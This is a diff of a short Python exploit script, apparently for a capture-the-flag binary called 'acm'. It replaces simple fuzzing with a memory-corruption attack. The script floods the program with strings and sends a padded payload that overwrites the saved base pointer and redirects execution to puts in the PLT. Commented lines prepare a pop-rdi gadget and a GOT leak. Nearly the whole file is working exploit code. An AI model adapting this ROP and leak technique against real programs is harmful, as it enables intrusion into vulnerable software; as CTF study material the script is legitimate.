@@ -1,52 +1,41 @@
 #!/usr/bin/env python
-# -*- coding: UTF-8 -*-
-# Auth0r : afang
-# nice day mua! :P
-# desc:
-
-#lambs:
-wait = lambda x: raw_input(x)
-
-# imports
+# coding: utf-8
 
 from binaryfang import *
-import time
-import os
-import sys
 
-elf = ""
-libc = ""
-env = ""
-LOCAL = 1
-context.log_level = "debug"
+elf = ELF("./acm")
+p = process('./acm')
+pprdi = 0x0000000000400c36
 
-p = process("./acm")
+p.sendline(str(0x2700))
 
-p.sendline("9000") #Init rounds.
-
-#round x
-
-def create_str(content):
-
-    p.sendline("1")
-    time.sleep(0.1)
+def addstr(content):
+    p.sendline(str(1))
     p.sendline(content)
 
-def sort():
+def showstr():
+    p.sendline(str(2))
 
-    p.sendline("2")
-    return p.recv()
+for i in range(0x240):
+    addstr('m'*0x10)
+addstr('m'*0x20)
 
-for i in range(60):
-
-    create_str("a" * (random.randint(100,200)))
+payload = 'm'*0x60
+payload += 'c'*8    # rbp
+#payload += p64(pprdi)
+#payload += p64(elf.got["strlen"])
+payload += p64(elf.plt["puts"])
+'''
+length = len(payload)
+for i in range(length-0x18, length):
+    tmp = payload[:i] + chr(0)
+    addstr(tmp)
+'''
+addstr(payload)
+for i in range(0x10):
+    addstr('m'*0x10)
 
 pause()
-
-#test binaryfang
-
-
-
-
-
+showstr()
+pause()
 
